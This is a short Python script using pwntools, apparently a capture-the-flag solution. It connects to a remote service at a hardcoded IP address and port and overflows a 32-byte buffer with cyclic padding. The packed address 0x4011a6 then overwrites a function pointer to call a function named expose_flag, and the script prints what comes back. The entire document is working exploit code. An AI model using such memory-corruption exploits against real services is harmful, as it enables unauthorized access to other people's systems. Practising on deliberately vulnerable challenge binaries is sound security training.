from pwn import *

# Setup connection to servlet
ip = "158.37.65.130"
port = 7002
io = remote(ip, port)

# Read initial message
print(io.readline(timeout=.5))

# Objdump -t can give us the address of expose_flag: 0x4011a6
# Fill buffer and overwrite function pointer with 0x4011a6
io.sendline(cyclic(32)+p64(0x4011a6))

io.shutdown('out')

print(str(io.readall(timeout=.5)))
